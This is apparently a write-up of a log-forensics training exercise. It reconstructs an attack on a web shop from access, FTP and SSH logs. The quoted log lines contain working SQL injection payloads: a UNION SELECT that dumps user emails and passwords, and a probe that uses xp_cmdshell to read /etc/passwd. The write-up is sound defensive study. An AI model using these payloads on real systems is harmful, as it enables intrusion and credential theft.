## Task 2 : Reconnaissance

#### What tools did the attacker use ? (Order by the occurrence in the log)

In log file "access.log", we can successively find Nmap, Hydra, sqlmap, curl and feroxbuster :

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] "POST / HTTP/1.1" 200 1924 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] "GET /rest/user/login HTTP/1.0" 500 - "-" "Mozilla/5.0 (Hydra)"

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] "GET /rest/products/search?q=1 HTTP/1.1" 200 - "-" "sqlmap/1.5.2#stable (http://sqlmap.org)"

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:32:51 +0000] "GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users-- HTTP/1.1" 200 3742 "-" "curl/7.74.0"

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] "GET /api HTTP/1.1" 500 - "-" "feroxbuster/2.2.1"

#### What endpoint was vulnerable to a brute-force attack ?

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:16:32 +0000] "POST **/rest/user/login** HTTP/1.0" 401 26 "-" "Mozilla/5.0 (Hydra)"

#### What endpoint was vulnerable to SQL injection ?

sqlmap is mainly used on /rest/products/search

#### What parameter was used for the SQL injection ?

The first two lines in access.log where user-agent is sqlmap :

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:29:14 +0000] "GET /rest/products/search?**q**=1 HTTP/1.1" 200 - "-" "sqlmap/1.5.2#stable (http://sqlmap.org)"
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:29:15 +0000] "GET /rest/products/search?**q**=1&QKqc=7074%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 - "-" "sqlmap/1.5.2#stable (http://sqlmap.org)"

#### What endpoint did the attacker try to use to retrieve files ?

Still in file access.log :

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:34:33 +0000] "GET **/ftp** HTTP/1.1" 200 4852 "-" "feroxbuster/2.2.1"
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:34:40 +0000] "GET **/ftp**/www-data.bak HTTP/1.1" 403 300 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:34:43 +0000] "GET **/ftp**/coupons_2013.md.bak HTTP/1.1" 403 78965 "-" ""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"


## Task 3 : Stolen data

#### What section of the website did the attacker use to scrape user email addresses ?

From the many lines such as 
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:11:42 +0000] "GET /rest/products/20/reviews HTTP/1.1" 304 - "http://192.168.10.4/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

one can infer that the attacker scrapped the "product reviews" section of the website to collect users' emails.

#### Was their brute-force attack successful ? If so, what is the timestamp of the successful login ?

The last line in file access.log where the user-agent is Hydra :
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:16:32 +0000] "POST /rest/user/login HTTP/1.0" 401 26 "-" "Mozilla/5.0 (Hydra)"

The attack succeeded at 11/Apr/2021:09:16:31 +0000.

#### What user information was the attacker able to retrieve from the endpoint vulnerable to SQL injection ?

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:31:04 +0000] "GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users-- HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:32:51 +0000] "GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users-- HTTP/1.1" 200 3742 "-" "curl/7.74.0"

email,password

#### What files did they try to download from the vulnerable endpoint ? (endpoint from the previous task, question #5)

> ::ffff:192.168.10.5 - - [11/Apr/2021:09:34:40 +0000] "GET /ftp/**www-data.bak** HTTP/1.1" 403 300 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
> ::ffff:192.168.10.5 - - [11/Apr/2021:09:34:43 +0000] "GET /ftp/**coupons_2013.md.bak** HTTP/1.1" 403 78965 "-" ""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

Also visible in file vsftpd.log :

> Sun Apr 11 09:35:45 2021 [pid 8154] [ftp] OK DOWNLOAD: Client "::ffff:192.168.10.5", "/**www-data.bak**", 2602 bytes, 544.81Kbyte/sec
> Sun Apr 11 09:36:08 2021 [pid 8154] [ftp] OK DOWNLOAD: Client "::ffff:192.168.10.5", "/**coupons_2013.md.bak**", 131 bytes, 3.01Kbyte/sec

#### What service and account name were used to retrieve files from the previous question ?

From the logs in file vsftpd.log :

ftp,anonymous

#### What service and username were used to gain shell access to the server ?

Look in auth.log :
> Apr 11 09:41:19 thunt sshd[8260]: Accepted password for www-data from 192.168.10.5 port 40112 ssh2

ssh,www-data
